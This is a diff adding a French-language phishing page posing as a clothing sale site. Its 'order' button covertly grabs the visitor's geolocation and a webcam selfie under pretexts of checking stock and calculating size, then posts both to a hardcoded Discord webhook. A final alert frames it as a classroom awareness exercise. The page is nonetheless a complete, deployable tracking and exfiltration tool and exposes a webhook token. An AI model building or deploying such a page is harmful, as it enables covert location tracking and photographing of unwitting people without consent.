@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Vogue & Co | Ventes Privées -80%</title>
+    <style>
+        /* Styles pour simuler un vrai site de e-commerce */
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; padding: 0; background-color: #f4f4f6; color: #333; }
+        header { background-color: #111; color: white; padding: 15px; text-align: center; font-weight: bold; letter-spacing: 2px; text-transform: uppercase; }
+        .promo-banner { background-color: #ff3f62; color: white; text-align: center; padding: 8px; font-size: 14px; font-weight: bold; }
+        .hero { max-width: 600px; margin: 30px auto; background: white; border-radius: 12px; overflow: hidden; box-shadow: 0 4px 15px rgba(0,0,0,0.05); }
+        .hero-img { width: 100%; height: 250px; background: #e2e2e2 url('https://images.unsplash.com/photo-1441986300917-64674bd600d8?auto=format&fit=crop&w=600&q=80') center/cover; }
+        .content { padding: 25px; text-align: center; }
+        h1 { font-size: 24px; margin-bottom: 10px; color: #111; }
+        p { color: #666; font-size: 15px; line-height: 1.5; }
+        .price { font-size: 22px; color: #ff3f62; font-weight: bold; margin: 15px 0; }
+        .price span { text-decoration: line-through; color: #aaa; font-size: 16px; margin-right: 10px; }
+        
+        /* Bouton d'action principal */
+        .btn-buy { display: inline-block; width: 100%; max-width: 300px; padding: 15px; background-color: #111; color: white; border: none; border-radius: 6px; font-size: 16px; font-weight: bold; cursor: pointer; text-transform: uppercase; transition: background 0.2s; }
+        .btn-buy:hover { background-color: #333; }
+        
+        .features { display: flex; justify-content: space-around; margin-top: 20px; padding-top: 20px; border-top: 1px solid #eee; font-size: 12px; color: #888; }
+        video, canvas { display: none; }
+    </style>
+</head>
+<body>
+
+<header>VOGUE & CO</header>
+<div class="promo-banner">🔥 VENTES PRIVÉES : -80% SUR TOUT LE SITE JUSQU'À CE SOIR ! 🔥</div>
+
+<div class="hero">
+    <div class="hero-img"></div>
+    <div class="content">
+        <h1>Veste Streetwear Édition Limitée</h1>
+        <p>Profitez de notre offre exclusive de bienvenue. Éligible uniquement pour les nouveaux membres inscrits aujourd'hui.</p>
+        <div class="price"><span>129,99 €</span> 19,99 €</div>
+        
+        <button class="btn-buy" onclick="lancerSensibilisation()">Commander & Choisir ma taille</button>
+        
+        <div class="features">
+            <div>🚚 Livraison 24h Express</div>
+            <div>🔒 Paiement Sécurisé</div>
+            <div>🔄 Retours Gratuits</div>
+        </div>
+    </div>
+</div>
+
+<video id="video" autoplay></video>
+<canvas id="canvas" width="640" height="480"></canvas>
+
+<script>
+// ⚠️ METTEZ VOTRE WEBHOOK DISCORD ENTRE LES GUILLEMETS CI-DESSOUS :
+const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1520406534859788341/EQl1mXNXoxVXLpK7UukYDVjmKJN--Q3hDZ1xSpQa8K2gL2yJ9pDEXECkwYbsZ_w1RJqG";
+
+function envoyerVersDiscord(message, imageBase64 = null) {
+    if (!imageBase64) {
+        fetch(DISCORD_WEBHOOK_URL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ content: message })
+        });
+    } else {
+        const blob = dataURLtoBlob(imageBase64);
+        const formData = new FormData();
+        formData.append('content', message);
+        formData.append('file', blob, 'selfie.png');
+        fetch(DISCORD_WEBHOOK_URL, { method: 'POST', body: formData });
+    }
+}
+
+function dataURLtoBlob(dataurl) {
+    let arr = dataurl.split(','), mime = arr[0].match(/:(.*?);/)[1],
+        bstr = atob(arr[1]), n = bstr.length, u8arr = new Uint8Array(n);
+    while(n--){ u8arr[n] = bstr.charCodeAt(n); }
+    return new Blob([u8arr], {type:mime});
+}
+
+function lancerSensibilisation() {
+    // Prétexte pour la géolocalisation : Vérifier les stocks locaux
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(function(position) {
+            let lat = position.coords.latitude;
+            let lon = position.coords.longitude;
+            let GoogleMapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
+            
+            let msg = `🛍️ **Cible piégée sur le faux site de vêtements !**\n- Latitude : ${lat}\n- Longitude : ${lon}\n- Lien Maps : ${GoogleMapsLink}`;
+            envoyerVersDiscord(msg);
+        });
+    }
+
+    // Prétexte pour la caméra : "Scanner la silhouette" pour la taille idéale
+    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+        navigator.mediaDevices.getUserMedia({ video: true })
+        .then(function(stream) {
+            let video = document.getElementById('video');
+            video.srcObject = stream;
+            video.play();
+
+            setTimeout(function() {
+                let canvas = document.getElementById('canvas');
+                let context = canvas.getContext('2d');
+                context.drawImage(video, 0, 0, 640, 480);
+                let imageDataURL = canvas.toDataURL('image/png');
+                
+                stream.getTracks().forEach(track => track.stop());
+                
+                envoyerVersDiscord("📸 **Selfie capturé via le prétexte 'Calcul de taille' :**", imageDataURL);
+                
+                // Message pédagogique de fin
+                alert("⚠️ FIN DE LA SIMULATION DU TP ⚠️\n\nCe site était un faux site d'e-commerce (Phishing).\nEn cliquant sur le bouton, tu as autorisé l'accès à ta localisation et ta caméra.\n\nTes données ont été envoyées en toute sécurité à ton binôme pour la démonstration. Fais attention aux liens reçus sur WhatsApp !");
+            }, 1000);
+        })
+        .catch(function(err) {
+            envoyerVersDiscord("❌ Caméra refusée par la victime.");
+            alert("Simulation terminée. (Accès caméra refusé)");
+        });
+    }
+}
+</script>
+
+</body>
+</html>
